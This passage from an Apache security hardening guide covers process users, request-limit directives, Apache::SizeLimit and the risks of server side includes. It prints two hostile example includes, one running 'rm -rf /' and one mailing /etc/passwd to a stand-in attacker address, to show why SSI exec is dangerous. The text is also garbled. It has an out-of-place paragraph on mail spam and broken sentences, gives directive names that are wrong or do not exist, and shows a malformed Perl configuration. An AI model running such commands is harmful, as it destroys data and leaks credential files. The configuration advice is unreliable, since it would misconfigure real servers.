    # Linux Web and Application Servers


    Apache is a tremendously flexible web server. In my years working with the Apache,
    I’ve seen it used in devices as small as a wrist watch, to the largest mainframe
    computers. Moreover, Apache is used in a multitude of application domains, and
    with the Rise of Web services, Apache as a services platform will become even
    more prevalent. This flexibility, evolution, and track record is why Apache owns
    the majority of the Web market share. It is why so important to take care in securing
    this crucial aspect of a Linux server infrastructure.


    First, it is important to understand how Apache runs and operates. Apache is typically
    bound to TCP port 80 (a default port for serving HTTP). When a service is run
    on port, it must be started as root or ports below 1023, the “Well Known Ports,”
    are considered privileged and thus has the ability to change the user of forked
    daemons. This is done by setting the “User” and “Group” names in the httpd config.
    The default configuration is User and Group “nobody”. The following shows the
    parent process started as root, and forked processes run as nobody, which handles
    the requests:


    ```bash

    root@ordor config# ps -ef | grep http

    root 5675 0:00 00:00 /usr/local/apache/bin/httpd

    nobody 5676 0:00 00:00 /usr/local/apache/bin/httpd

    nobody 5677 0:00 00:00 /usr/local/apache/bin/httpd

    nobody 5678 0:00 00:00 /usr/local/apache/bin/httpd

    nobody 5679 0:00 00:00 /usr/local/apache/bin/httpd

    nobody 5680 0:00 00:00 /usr/local/apache/bin/httpd

    ```


    Mail server administrators should have a solid understanding of SPAM related topics,
    and issues, such as relays and RBLs, for further information on these subjects,
    see: http://mailabuse.org/rbl/, and http://www.spamtrap.org/. As HTTP is built
    on Apache, comments about Apache configuration and operation can be applied to
    the HTTP Server as well. IANA port number: http://www.iana.org/assignments/port-numbers


    As these users and groups are configured, many people will create a user or group
    specifically for handling httpd processes (such as web”). Another way to avoid
    starting the process as root is to run Apache on a port above 1023 (many sites
    use 8080), which allows Apache to be started by a non-privileged user.


    # Apache Security Configuration


    As we saw above with Group directives, MaxRequests limits the amount of requests
    can be sent over a single connection. This is another method for controlling potential
    DoS attacks. Setting this parameter higher increases performance but also increases
    the potential for someone to attempt DoS. The default is 100, which I have found
    to be a nice setting for your site requirements.


    KeepAliveTimeout limits the number of seconds that Apache will wait for the next
    request from the same client. The default is 15, and can be another useful configuration
    from closing those connections that an attacker may be holding open for DoS.


    LimitRequestBody specifies the number of bytes from 0 (meaning unlimited) that
    are allowed in a request body. The default value is defined by the compile-time
    constant DEFAULT_LIMIT_BODY (0). The LimitRequestBody directive allows the user
    to set a limit on the allowed size of request message body within the context
    of per-directory, per-file or per-location. If the client exceeds that limit,
    the server will return an error response instead of servicing the request. The
    size of normal message body will vary greatly depending on the nature of the resource.


    LimitRequestFields takes a number as an integer from 0 (meaning unlimited) to
    32767. The default value is the number of request fields used by a client rarely
    exceeds 20, but may vary among different client implementations. This directive
    can limit the exposure of headers where an attacker attempts to overflow a server
    with an abnormally long list of request headers. Other limit directives include:


    - LimitRequestSize which limits the size of each request header;

    - LimitRequestLine limits the length of each request line;

    - LimitRequestBody which limits the maximum byte size of an XML-based request.


    Limiting physical resources is another useful method for providing "backstops"
    to Apache processes and applications for overwhelming your server. These are often
    used as security harnesses to prevent attacks against your Web server from taking
    the entire machine down. Apache::SizeLimit is a Perl module which allows you to
    kill Apache processes if they grow too large (either intentionally from an attack
    or unintentionally from a bug or memory leak). This can be a useful control on
    Apache server to limit the potential for a runaway process from dropping Linux
    output. The following is how you would configure Apache::SizeLimit in your httpd.conf:


    ```perl

    FixHandler Apache::SizeLimit

    use Apache::SizeLimit;

    # Max shared -- only kill processes that are truly using too physical RAM

    MAX_UNSHARED_SIZE = 30000; # 30MB

    # check the process size every time the process checker is called

    CHECK_EVERY_N_REQUESTS = 2;

    ```


    Server side includes (SSI) is a powerful way to include dynamic content in a Web
    page, as displaying the current date and time, and as the following server side
    include embedded in a Web page:


    ```

    <!--exec cmd="date +%x"/>

    ```


    This would output to the Web page:

    11/16/2001


    Without proper security, SSI enables Linux programs to be invoked from a Web page
    - exposing a host of security risks. If SSI is not necessary for your site, you
    can specify:


    Options None


    This directive will disable all "Options" from the container it is specified within.
    If SSI functionality is required, it is strongly recommended to disallow execution
    of CGI scripts through SSI:


    Options IncludesNOEXEC


    Which would allow server side includes, but disables execution of programs through
    #exec or #include. Why bother? Two reasons. The first is that it can be a tremendous
    security risk, such as:


    ```

    <!--exec cmd="rm -rf /"/>

    <!--exec cmd="mail badguy@badguysite.org | cat /etc/passwd"/>

    ```


    Obviously, these are very malicious includes, but could be permitted if SSI and
    CGI security is not properly configured in your server. The second reason is that
    there are a variety of more secure and efficient ways to provide dynamic content
    to a Web page, such as using a protected CGI, a PHP program, or a Java application.


    Apache provides a convenient tool for easily applying per directory, called .htaccess.
    An “htaccess” is a file containing Apache configuration directives. Those directives
    apply to everything in the directory.


    Other related modules include mod_throttle, Apache::Resource and Randal Schwartz''s
    Throttle module.

